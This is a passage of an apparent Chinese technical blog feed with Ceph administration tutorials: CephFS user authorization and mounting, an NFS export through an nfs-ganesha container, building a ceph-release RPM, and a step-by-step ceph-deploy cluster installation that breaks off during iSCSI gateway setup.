<h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><p>创建一个名称为<code>client.kubefs</code>的用户，使其在<code>/</code>目录下有只读的权限，在<code>/kubefs</code>目录下有读写权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph fs authorize cephfs client.kubefs / r /kubefs rw</span><br></pre></td></tr></table></figure>
<p><code>cephfs</code>为<code>filesystem name</code>，可以通过<code>ceph fs ls</code>查询。用户创建成功后，可以通过<code>ceph auth list</code>查询用户权限。需要删除用户也可以通过<code>ceph auth rm</code>仅限删除操作。</p>
<h3 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mount -t ceph &lt;monitor ip&gt;:6789:/kubefs /mnt/ -o name=kubefs,secret=xxxxxxxxxxxxxxxxxxxxxx==</span><br></pre></td></tr></table></figure>

<h1 id="export-nfs"><a href="#export-nfs" class="headerlink" title="export nfs"></a>export nfs</h1><p>cephfs本身不支持nfs协议，可以通过nfs-ganesha将cephfs转成nfs提供出去。</p>
<h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><p><a href="https://hub.docker.com/r/ananace/nfs-ganesha-ceph">ananace&#x2F;nfs-ganesha-ceph</a></p>
<h3 id="ganesha配置"><a href="#ganesha配置" class="headerlink" title="ganesha配置"></a>ganesha配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># NFS protocol options</span><br><span class="line">EXPORT</span><br><span class="line">&#123;</span><br><span class="line">  # Export Id (mandatory, each EXPORT must have a unique Export_Id)</span><br><span class="line">  Export_Id = 77;</span><br><span class="line"></span><br><span class="line">  # Exported path (mandatory)</span><br><span class="line">  Path = /;</span><br><span class="line"></span><br><span class="line">  # Pseudo Path (for NFS v4)</span><br><span class="line">  Pseudo = /;</span><br><span class="line"></span><br><span class="line">  # Access control options</span><br><span class="line">  Access_Type = RW;</span><br><span class="line">  Squash = No_Root_Squash;</span><br><span class="line"></span><br><span class="line">  # NFS protocol options</span><br><span class="line">  SecType = &quot;sys&quot;;</span><br><span class="line">  Transports = TCP;</span><br><span class="line">  Protocols = 4;</span><br><span class="line"></span><br><span class="line">  # Exporting FSAL</span><br><span class="line">  FSAL &#123;</span><br><span class="line">    Name = CEPH;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="运行ganesha容器"><a href="#运行ganesha容器" class="headerlink" title="运行ganesha容器"></a>运行ganesha容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --net=host  -v /home/xxx/ceph/etc_ceph/:/etc/ceph -v /home/xxx/ceph/ganesha/:/etc/ganesha --name nfs -e GANESHA_BOOTSTRAP_CONFIG=no ananace/nfs-ganesha-ceph</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>docker</tag>
        <tag>nfs</tag>
        <tag>cephfs</tag>
      </tags>
  </entry>
  <entry>
    <title>ceph-release RPM包build</title>
    <url>/2019/12/11/storage/ceph/ceph-release-rpm-build/</url>
    <content><![CDATA[<p><code>ceph-release</code> rpm包用于在<code>/etc/yum.repos.d/</code>目录下安装<code>ceph.repo</code>文件。<br>本人使用容器进行RPM包构建，镜像为<code>centos:7</code>（<code>hub.docker.com</code>下载）</p>
<h1 id="rpmbuild安装"><a href="#rpmbuild安装" class="headerlink" title="rpmbuild安装"></a>rpmbuild安装</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y rpm-build</span><br></pre></td></tr></table></figure>

<h1 id="rpmbuild目录树建立"><a href="#rpmbuild目录树建立" class="headerlink" title="rpmbuild目录树建立"></a>rpmbuild目录树建立</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -pv ~/rpmbuild/&#123;BUILD,RPMS,SOURCES,SPECS,SRPMS,BUILDROOT&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>SPEC 保存RPM包配置（.spec）文件</li>
<li>SOURCES 源代码目录,保存源码包（如.tar 包）和所有patch补丁</li>
<li>BUILD 构建目录,源码包被解压至此，并在该目录的子目录完成编译</li>
<li>BUILDROOT 最终安装目录,保存 %install 阶段安装的文件,打包好后此目录相关内容会自动删除</li>
<li>RPMS 标准RPM包目录,生成&#x2F;保存二进制RPM包</li>
<li>SRPMS 源代码RPM包目录,生成&#x2F;保存源码RPM包(SRPM)</li>
</ul>
<h1 id="构建BUILDROOT目录"><a href="#构建BUILDROOT目录" class="headerlink" title="构建BUILDROOT目录"></a>构建BUILDROOT目录</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p ~/rpmbuild/BUILDROOT/ceph-release-1-1.el7.noarch/etc/yum.repos.d/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">必须建一个你程序名的一个目录</span></span><br></pre></td></tr></table></figure>
<p>在<code>~/rpmbuild/BUILDROOT/ceph-release-1-1.el7.noarch/etc/yum.repos.d/</code>目录下创建<code>ceph.repo</code>文件，并写入如下内容:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Ceph]</span><br><span class="line">name=Ceph packages for $basearch</span><br><span class="line">baseurl=http://10.100.13.112/rpm-mimic/el7/$basearch</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line"></span><br><span class="line">[Ceph-noarch]</span><br><span class="line">name=Ceph noarch packages</span><br><span class="line">baseurl=http://10.100.13.112/rpm-mimic/el7/noarch</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br></pre></td></tr></table></figure>

<h1 id="编写SPEC文件"><a href="#编写SPEC文件" class="headerlink" title="编写SPEC文件"></a>编写SPEC文件</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">touch ~/rpmbuild/SPEC/ceph-release.spec</span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Name: ceph-release</span><br><span class="line">Version: 1</span><br><span class="line">Release: 1.el7</span><br><span class="line">Summary: Ceph Release</span><br><span class="line">License: GPL</span><br><span class="line">Group: Applications/System</span><br><span class="line">Vendor: zhoub</span><br><span class="line">Buildarch: noarch</span><br><span class="line"></span><br><span class="line">%description</span><br><span class="line">%prep</span><br><span class="line">%build</span><br><span class="line">%pre</span><br><span class="line">%post</span><br><span class="line">%preun</span><br><span class="line">%postun</span><br><span class="line">%files</span><br><span class="line">/etc/yum.repos.d/ceph.repo</span><br><span class="line">%changelog</span><br></pre></td></tr></table></figure>

<ul>
<li>Name 标签就是软件名，Version标签为版本号，而Release是发布编号。</li>
<li>Summary 标签是简要说明，英文的话第一个字母应大写，以避免rpmlint工具（打包检查工具）警告</li>
<li>License 标签说明软件包的协议版本，审查软件的License状态是打包者的职责，这可以通过检查源码或LICENSE文件，或与作者沟通来完成。</li>
<li>Group 标签过去用于按照<code>/usr/share/doc/rpm-/GROUPS</code>分类软件包。目前该标记已丢弃，vim的模板还有这一条，删掉即可，不过添加该标记也不会有任何影响。</li>
<li>%changelog 标签应包含每个Release所做的更改日志，尤其应包含上游的安全&#x2F;漏洞补丁的说明。Changelog日志可使用<code>rpm --changelog -q &lt;packagename&gt;</code>查询，通过查询可得知已安装的软件是否包含指定漏洞和安全补丁。<code>%changelog</code>条目应包含版本字符串，以避免rpmlint工具警告。</li>
<li>多行的部分，如<code>%changelog</code>或<code>%description</code>由指令下一行开始，空行结束。</li>
<li>一些不需要的行(如BuildRequires和Requires)可使用‘#’注释。</li>
<li><code>%prep</code>、<code>%build</code>、<code>%install</code>、<code>%file</code>暂时用默认的，未做任何修改。</li>
</ul>
<h1 id="构建RPM包"><a href="#构建RPM包" class="headerlink" title="构建RPM包"></a>构建RPM包</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpmbuild -bb ~/rpmbuild/SPEC/ceph-release.spec</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://blog.csdn.net/weixin_44208042/article/details/89216844">centos7使用rpmbuild制作rpm包</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
      </tags>
  </entry>
  <entry>
    <title>Ceph环境部署</title>
    <url>/2019/08/20/storage/ceph/changcun-ceph-deployment/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h2 id="硬件环境"><a href="#硬件环境" class="headerlink" title="硬件环境"></a>硬件环境</h2><ul>
<li>CPU</li>
<li>内存</li>
<li>硬盘<br>  SAS 300G x 2<br>  SATA 6T x 4<br>  SSD 480G x 6</li>
</ul>
<h2 id="软件环境"><a href="#软件环境" class="headerlink" title="软件环境"></a>软件环境</h2><ul>
<li>操作系统<br>  Centos 7.6.1810</li>
<li>Ceph软件版本<br>  14.2.2</li>
</ul>
<h1 id="部署方案"><a href="#部署方案" class="headerlink" title="部署方案"></a>部署方案</h1><p><img src="/images/ceph/changcun_ceph_solution.png" alt="changcun_ceph_solution.png"></p>
<h3 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h3><p>两个SAS盘（300G）做成RAID1，用于存储操作系统。</p>
<h3 id="SATA-Pool"><a href="#SATA-Pool" class="headerlink" title="SATA Pool"></a>SATA Pool</h3><ul>
<li>OSD Data<br>  每个SATA（6T）做成RAID0，用于存储每个OSD数据</li>
<li>OSD Journal<br>  两个SSD（480G）做成RAID1，再分成4个分区给每台主机中的4个OSD提供Journal数据存储服务</li>
<li>ObjectStore<br>  OSD后端存储引擎使用Filestore</li>
<li>Replication<br>  副本数：3<br>  最小允许副本数：1</li>
</ul>
<h3 id="SSD-Pool"><a href="#SSD-Pool" class="headerlink" title="SSD Pool"></a>SSD Pool</h3><ul>
<li>OSD<br>  每个SSD（480G）做成RAID0，用于存储每个OSD的数据</li>
<li>ObjectStore<br>  OSD后端存储引擎使用Bluestore</li>
<li>Replication<br>  副本数：3<br>  最小允许副本数：1</li>
</ul>
<h1 id="部署步骤"><a href="#部署步骤" class="headerlink" title="部署步骤"></a>部署步骤</h1><h2 id="Ceph集群部署"><a href="#Ceph集群部署" class="headerlink" title="Ceph集群部署"></a>Ceph集群部署</h2><p>Ceph集群的节点分为管理节点、MON节点、OSD节点</p>
<table>
<thead>
<tr>
<th align="center">节点</th>
<th align="left">用途</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MON节点</td>
<td align="left">用于监控集群、为客户端提供ClusterMap等服务</td>
</tr>
<tr>
<td align="center">OSD节点</td>
<td align="left">数据存储节点，用于完成数据的持久化工作</td>
</tr>
<tr>
<td align="center">ADMIN节点</td>
<td align="left">集群维护管理节点，提供管理员权限</td>
</tr>
<tr>
<td align="center">MDS节点</td>
<td align="left">提供Cephfs服务</td>
</tr>
<tr>
<td align="center">RGW节点</td>
<td align="left">提供对象存储服务</td>
</tr>
<tr>
<td align="center">MGR节点</td>
<td align="left">提供监控（zabbix、prometheus等）、dashboard等服务</td>
</tr>
<tr>
<td align="center">iSCSI-GW节点</td>
<td align="left">提供iSCSI Target 服务</td>
</tr>
</tbody></table>
<p>更多Ceph内容，请见<a href="https://docs.ceph.com/docs/nautilus/">此链接</a></p>
<ul>
<li>需要在部署集群前，做通管理节点与集群节点（包括：MON节点、OSD节点）之间的ssh无密码访问。</li>
<li>将各个节点的hostname和ip地址对应后，写入<code>/etc/hosts</code>文件，并将此文件同步到各个节点上<br>  以ceph13为例：  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@ceph13 cluster]# cat /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line"></span><br><span class="line">10.53.2.13      ceph13  ceph13</span><br><span class="line">10.53.2.16      ceph16  ceph16</span><br><span class="line">10.53.2.19      ceph19  ceph19</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Ceph-deploy-安装"><a href="#Ceph-deploy-安装" class="headerlink" title="Ceph-deploy 安装"></a>Ceph-deploy 安装</h3><p>在管理节点上安装Ceph-deploy工具。</p>
<p>安装EPEL</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y epel-release</span><br></pre></td></tr></table></figure>

<p>修改&#x2F;增加ceph.repo，并安装ceph-deploy</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ceph-noarch]</span><br><span class="line">name=Ceph noarch packages</span><br><span class="line">baseurl=https://download.ceph.com/rpm-nautilus/el7/noarch</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">type=rpm-md</span><br><span class="line">gpgkey=https://download.ceph.com/keys/release.asc</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum update -y</span><br><span class="line">yum install -y ceph-deploy</span><br></pre></td></tr></table></figure>

<h3 id="Create-the-cluster"><a href="#Create-the-cluster" class="headerlink" title="Create the cluster"></a>Create the cluster</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir &#123;my-cluster&#125;</span><br><span class="line">cd &#123;my-cluster&#125;</span><br><span class="line">ceph-deploy new &#123;initial-monitor-node(s)&#125;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@ceph13 ~]# mkdir cluster</span><br><span class="line">[root@ceph13 ~]# cd cluster</span><br><span class="line">[root@ceph13 cluster]# ceph-deploy new ceph13 ceph16 ceph19</span><br></pre></td></tr></table></figure>

<h3 id="修改集群初始化配置"><a href="#修改集群初始化配置" class="headerlink" title="修改集群初始化配置"></a>修改集群初始化配置</h3><p>修改<code>&#123;my-cluster&#125;</code>目录中的<code>ceph.conf</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@ceph13 cluster]# ls -al</span><br><span class="line">总用量 600</span><br><span class="line">drwxr-xr-x. 2 root root    244 8月  21 15:51 .</span><br><span class="line">dr-xr-x---. 8 root root   4096 8月  11 16:27 ..</span><br><span class="line">-rw-------. 1 root root    113 8月  10 16:17 ceph.bootstrap-mds.keyring</span><br><span class="line">-rw-------. 1 root root    113 8月  10 16:17 ceph.bootstrap-mgr.keyring</span><br><span class="line">-rw-------. 1 root root    113 8月  10 16:17 ceph.bootstrap-osd.keyring</span><br><span class="line">-rw-------. 1 root root    113 8月  10 16:17 ceph.bootstrap-rgw.keyring</span><br><span class="line">-rw-------. 1 root root    151 8月  10 16:17 ceph.client.admin.keyring</span><br><span class="line">-rw-r--r--. 1 root root    293 8月  10 15:15 ceph.conf</span><br><span class="line">-rw-r--r--. 1 root root 580431 8月  10 17:13 ceph-deploy-ceph.log</span><br><span class="line">-rw-------. 1 root root     73 8月  10 15:12 ceph.mon.keyring</span><br></pre></td></tr></table></figure>

<ul>
<li>配置public、cluster网络</li>
<li>配置osd rebalance</li>
<li>配置scrub和deep-scrub</li>
<li>关闭crushmap 启动更新配置<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">public network = &#123;ip-address&#125;/&#123;bits&#125;</span><br><span class="line">cluster network = &#123;ip-address&#125;/&#123;bits&#125;</span><br><span class="line"></span><br><span class="line">osd crush update on start = false</span><br><span class="line"></span><br><span class="line">[osd]</span><br><span class="line">osd max backfills = 1</span><br><span class="line">osd recovery op priority = 1</span><br><span class="line">osd recovery max active = 1</span><br><span class="line">osd client op priority = 63</span><br><span class="line">osd recovery delay start = 0.5</span><br><span class="line"></span><br><span class="line">osd scrub chunk min = 1</span><br><span class="line">osd scrub chunk max = 5</span><br><span class="line">osd scrub sleep = 5</span><br><span class="line">osd deep scrub interval = 2592000 # 60(秒)*60(分)*24(时)*30(天)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@ceph13 cluster]# cat /etc/ceph/ceph.conf </span><br><span class="line">[global]</span><br><span class="line">fsid = 20192dd5-3228-4135-9831-c9d7de74a890</span><br><span class="line">mon_initial_members = ceph13, ceph16, ceph19</span><br><span class="line">mon_host = 10.53.2.13,10.53.2.16,10.53.2.19</span><br><span class="line">auth_cluster_required = cephx</span><br><span class="line">auth_service_required = cephx</span><br><span class="line">auth_client_required = cephx</span><br><span class="line">osd crush update on start = false</span><br><span class="line"></span><br><span class="line">public network = 10.53.2.0/24</span><br><span class="line">cluster network = 10.53.1.0/24</span><br><span class="line"></span><br><span class="line">[osd]</span><br><span class="line">osd max backfills = 1</span><br><span class="line">osd recovery op priority = 1</span><br><span class="line">osd recovery max active = 1</span><br><span class="line">osd client op priority = 63</span><br><span class="line">osd recovery delay start = 0.5</span><br><span class="line"></span><br><span class="line">osd scrub chunk min = 1</span><br><span class="line">osd scrub chunk max = 5</span><br><span class="line">osd scrub sleep = 5</span><br><span class="line">osd deep scrub interval = 2592000</span><br></pre></td></tr></table></figure>

<h3 id="ceph软件安装"><a href="#ceph软件安装" class="headerlink" title="ceph软件安装"></a>ceph软件安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph-deploy install --stable nautilus &#123;ceph-node(s)&#125;</span><br></pre></td></tr></table></figure>

<p>eg: </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph-deploy install --stable nautilus ceph13 ceph16 ceph19</span><br></pre></td></tr></table></figure>

<p>*** 此处安装过程比较慢，失败的话建议重试几次。***</p>
<h3 id="MON节点创建初始化"><a href="#MON节点创建初始化" class="headerlink" title="MON节点创建初始化"></a>MON节点创建初始化</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph-deploy mon create-initial</span><br></pre></td></tr></table></figure>
<p>此命令会根据<code>ceph.conf</code>进行MON节点的创建及初始化工作</p>
<h3 id="部署管理节点"><a href="#部署管理节点" class="headerlink" title="部署管理节点"></a>部署管理节点</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph-deploy admin &#123;ceph-node(s)&#125;</span><br></pre></td></tr></table></figure>
<p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph-deploy admin ceph13 ceph16 ceph19</span><br></pre></td></tr></table></figure>

<h3 id="部署mgr节点（可选）"><a href="#部署mgr节点（可选）" class="headerlink" title="部署mgr节点（可选）"></a>部署mgr节点（可选）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph-deploy mgr create &#123;ceph-node(s)&#125;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph-deploy mgr create ceph13 ceph16 ceph19</span><br></pre></td></tr></table></figure>

<p>*** 若不部署mgr服务，集群会有告警，但不影响使用。***</p>
<h3 id="部署OSD节点（Filestore）"><a href="#部署OSD节点（Filestore）" class="headerlink" title="部署OSD节点（Filestore）"></a>部署OSD节点（Filestore）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph-deploy osd create --filestore --data &#123;device path&#125; --journal &#123;device path&#125; &#123;ceph-node&#125; </span><br></pre></td></tr></table></figure>

<ul>
<li><code>--filestore</code><br>  指定数据存储引擎</li>
<li><code>--data</code><br>  指定osd数据存储设备(SATA盘)</li>
<li><code>--journal</code><br>  指定osd journal存储设备(SSD Journal盘)</li>
<li><code>ceph-node</code><br>  指定osd所在主机的hostname</li>
</ul>
<p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph-deploy osd create ceph13 --filestore --data /dev/sdb --journal /dev/sdf1</span><br><span class="line">ceph-deploy osd create ceph13 --filestore --data /dev/sdb --journal /dev/sdf1</span><br><span class="line">ceph-deploy osd create ceph13 --filestore --data /dev/sdc --journal /dev/sdf2</span><br><span class="line">ceph-deploy osd create ceph13 --filestore --data /dev/sdd --journal /dev/sdf3</span><br><span class="line">ceph-deploy osd create ceph13 --filestore --data /dev/sde --journal /dev/sdf4</span><br><span class="line">ceph-deploy osd create ceph16 --filestore --data /dev/sdb --journal /dev/sdf1</span><br><span class="line">ceph-deploy osd create ceph16 --filestore --data /dev/sdc --journal /dev/sdf2</span><br><span class="line">ceph-deploy osd create ceph16 --filestore --data /dev/sdd --journal /dev/sdf3</span><br><span class="line">ceph-deploy osd create ceph16 --filestore --data /dev/sde --journal /dev/sdf4</span><br><span class="line">ceph-deploy osd create ceph19 --filestore --data /dev/sdb --journal /dev/sdf1</span><br><span class="line">ceph-deploy osd create ceph19 --filestore --data /dev/sdc --journal /dev/sdf2</span><br><span class="line">ceph-deploy osd create ceph19 --filestore --data /dev/sdd --journal /dev/sdf3</span><br><span class="line">ceph-deploy osd create ceph19 --filestore --data /dev/sde --journal /dev/sdf4</span><br></pre></td></tr></table></figure>

<h3 id="部署OSD节点（Bluestore）"><a href="#部署OSD节点（Bluestore）" class="headerlink" title="部署OSD节点（Bluestore）"></a>部署OSD节点（Bluestore）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph-deploy osd create --data &#123;device path&#125; &#123;ceph-node&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>--data</code><br>  指定osd数据存储设备(SSD盘)</li>
<li><code>ceph-node</code><br>  指定osd所在主机的hostname</li>
</ul>
<p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph-deploy osd create ceph13 --data /dev/sdg</span><br><span class="line">ceph-deploy osd create ceph13 --data /dev/sdh</span><br><span class="line">ceph-deploy osd create ceph13 --data /dev/sdi</span><br><span class="line">ceph-deploy osd create ceph13 --data /dev/sdj</span><br><span class="line">ceph-deploy osd create ceph16 --data /dev/sdg</span><br><span class="line">ceph-deploy osd create ceph16 --data /dev/sdh</span><br><span class="line">ceph-deploy osd create ceph16 --data /dev/sdi</span><br><span class="line">ceph-deploy osd create ceph16 --data /dev/sdj</span><br><span class="line">ceph-deploy osd create ceph19 --data /dev/sdg</span><br><span class="line">ceph-deploy osd create ceph19 --data /dev/sdh</span><br><span class="line">ceph-deploy osd create ceph19 --data /dev/sdi</span><br><span class="line">ceph-deploy osd create ceph19 --data /dev/sdj</span><br></pre></td></tr></table></figure>

<p>部署完所有OSD节点后，此集群部署完成可以通过<code>ceph -s</code>查看集群状态。</p>
<p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@ceph13 cluster]# ceph -s</span><br><span class="line">  cluster:</span><br><span class="line">    id:     20192dd5-3228-4135-9831-c9d7de74a890</span><br><span class="line">    health: HEALTH_OK</span><br><span class="line"></span><br><span class="line">  services:</span><br><span class="line">    mon: 3 daemons, quorum ceph13,ceph16,ceph19 (age 10d)</span><br><span class="line">    mgr: ceph13(active, since 10d), standbys: ceph16, ceph19</span><br><span class="line">    osd: 24 osds: 24 up (since 9d), 24 in (since 10d)</span><br><span class="line"></span><br><span class="line">  data:</span><br><span class="line">    pools:   3 pools, 1536 pgs</span><br><span class="line">    objects: 20.80k objects, 81 GiB</span><br><span class="line">    usage:   244 GiB used, 70 TiB / 71 TiB avail</span><br><span class="line">    pgs:     1536 active+clean</span><br><span class="line"></span><br><span class="line">  io:</span><br><span class="line">    client:   309 KiB/s rd, 145 KiB/s wr, 41 op/s rd, 12 op/s wr</span><br><span class="line"></span><br><span class="line">[root@ceph13 cluster]# ceph osd tree</span><br><span class="line">ID  CLASS WEIGHT   TYPE NAME            STATUS REWEIGHT PRI-AFF </span><br><span class="line">-15        5.21997 root ssd                                     </span><br><span class="line"> -9        1.73999     host ceph13_ssd                          </span><br><span class="line"> 12   ssd  0.43500         osd.12           up  1.00000 1.00000 </span><br><span class="line"> 13   ssd  0.43500         osd.13           up  1.00000 1.00000 </span><br><span class="line"> 14   ssd  0.43500         osd.14           up  1.00000 1.00000 </span><br><span class="line"> 15   ssd  0.43500         osd.15           up  1.00000 1.00000 </span><br><span class="line">-11        1.73999     host ceph16_ssd                          </span><br><span class="line"> 16   ssd  0.43500         osd.16           up  1.00000 1.00000 </span><br><span class="line"> 17   ssd  0.43500         osd.17           up  1.00000 1.00000 </span><br><span class="line"> 18   ssd  0.43500         osd.18           up  1.00000 1.00000 </span><br><span class="line"> 19   ssd  0.43500         osd.19           up  1.00000 1.00000 </span><br><span class="line">-13        1.73999     host ceph19_ssd                          </span><br><span class="line"> 20   ssd  0.43500         osd.20           up  1.00000 1.00000 </span><br><span class="line"> 21   ssd  0.43500         osd.21           up  1.00000 1.00000 </span><br><span class="line"> 22   ssd  0.43500         osd.22           up  1.00000 1.00000 </span><br><span class="line"> 23   ssd  0.43500         osd.23           up  1.00000 1.00000 </span><br><span class="line"> -1       65.41200 root default                                 </span><br><span class="line"> -3       21.80400     host ceph13_sata                         </span><br><span class="line">  0   hdd  5.45099         osd.0            up  1.00000 1.00000 </span><br><span class="line">  1   hdd  5.45099         osd.1            up  1.00000 1.00000 </span><br><span class="line">  2   hdd  5.45099         osd.2            up  1.00000 1.00000 </span><br><span class="line">  3   hdd  5.45099         osd.3            up  1.00000 1.00000 </span><br><span class="line"> -5       21.80400     host ceph16_sata                         </span><br><span class="line">  4   hdd  5.45099         osd.4            up  1.00000 1.00000 </span><br><span class="line">  5   hdd  5.45099         osd.5            up  1.00000 1.00000 </span><br><span class="line">  6   hdd  5.45099         osd.6            up  1.00000 1.00000 </span><br><span class="line">  7   hdd  5.45099         osd.7            up  1.00000 1.00000 </span><br><span class="line"> -7       21.80400     host ceph19_sata                         </span><br><span class="line">  8   hdd  5.45099         osd.8            up  1.00000 1.00000 </span><br><span class="line">  9   hdd  5.45099         osd.9            up  1.00000 1.00000 </span><br><span class="line"> 10   hdd  5.45099         osd.10           up  1.00000 1.00000 </span><br><span class="line"> 11   hdd  5.45099         osd.11           up  1.00000 1.00000 </span><br></pre></td></tr></table></figure>

<h2 id="iscsi-gw部署"><a href="#iscsi-gw部署" class="headerlink" title="iscsi-gw部署"></a>iscsi-gw部署</h2><h3 id="依赖软件安装"><a href="#依赖软件安装" class="headerlink" title="依赖软件安装"></a>依赖软件安装</h3><p>iscsi-gw软件在<code>192.168.1.70</code>的<code>/home/zhoub/rpms</code>目录下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[zhoub@CentOS ceph-iscsi-rpms]$ ls -al</span><br><span class="line">总用量 588</span><br><span class="line">drwxr-xr-x.  9 zhoub zhoub   4096 6月  19 16:31 .</span><br><span class="line">drwxrwxr-x.  3 zhoub zhoub     53 8月   8 13:42 ..</span><br><span class="line">drwxrwxr-x. 10 zhoub zhoub   4096 6月  19 16:10 ceph-iscsi</span><br><span class="line">drwxrwxr-x.  9 zhoub zhoub    213 6月  19 16:10 configshell-fb</span><br><span class="line">-rw-r--r--.  1 root  root  284340 8月  11 2017 libnl3-3.2.28-4.el7.x86_64.rpm</span><br><span class="line">drwxrwxr-x.  2 zhoub zhoub    240 6月  19 15:51 pip</span><br><span class="line">drwxr-xr-x.  2 zhoub zhoub   4096 6月  19 16:10 pip_packages</span><br><span class="line">-rw-r--r--.  1 root  root  137912 11月 12 2018 pyOpenSSL-0.13.1-4.el7.x86_64.rpm</span><br><span class="line">-rw-r--r--.  1 root  root   96088 7月   4 2014 pyparsing-1.5.6-9.el7.noarch.rpm</span><br><span class="line">-rw-r--r--.  1 root  root   58008 7月   4 2014 python-kmod-0.9-4.el7.x86_64.rpm</span><br><span class="line">-rw-r--r--.  1 zhoub zhoub     76 6月  19 16:10 requirement.txt</span><br><span class="line">drwxrwxr-x. 11 zhoub zhoub    223 6月  19 16:10 rtslib-fb</span><br><span class="line">drwxrwxr-x. 10 zhoub zhoub    248 6月  19 16:10 targetcli-fb</span><br><span class="line">drwxr-xr-x.  2 root  root     112 6月  19 16:28 tcmu-runner</span><br></pre></td></tr></table></figure>

<h4 id="pip安装"><a href="#pip安装" class="headerlink" title="pip安装"></a>pip安装</h4><p>在<code>rpms/ceph-iscsi-rpms/pip</code>目录下。</p>
<p>pip 安装依赖的软件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[zhoub@CentOS pip]$ ls -al</span><br><span class="line">总用量 4080</span><br><span class="line">drwxrwxr-x. 2 zhoub zhoub     240 6月  19 15:51 .</span><br><span class="line">drwxr-xr-x. 9 zhoub zhoub    4096 6月  19 16:31 ..</span><br><span class="line">-rw-rw-r--. 1 zhoub zhoub 3700178 6月  19 15:31 pip_19.1.1.tar.gz</span><br><span class="line">-rw-r--r--. 1 root  root     5932 3月  14 2015 python-backports-1.0-8.el7.x86_64.rpm</span><br><span class="line">-rw-r--r--. 1 root  root    12896 4月  25 2018 python-backports-ssl_match_hostname-3.5.0.1-1.el7.noarch.rpm</span><br><span class="line">-rw-r--r--. 1 root  root    35176 11月 21 2016 python-ipaddress-1.0.16-2.el7.noarch.rpm</span><br><span class="line">-rw-r--r--. 1 root  root   406404 8月  11 2017 python-setuptools-0.9.8-7.el7.noarch.rpm</span><br></pre></td></tr></table></figure>
<p>安装pip及其依赖的软件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd pip</span><br><span class="line">yum localinstall *.rpm</span><br><span class="line">tar -xzvf ./pip_19.1.1.tar.gz</span><br><span class="line">cd pip_19.1.1</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>

<h4 id="安装pip-package"><a href="#安装pip-package" class="headerlink" title="安装pip package"></a>安装pip package</h4><p>在线安装使用<code>rpms/ceph-iscsi-rpms/requirement.txt</code>文件进行安装</p>
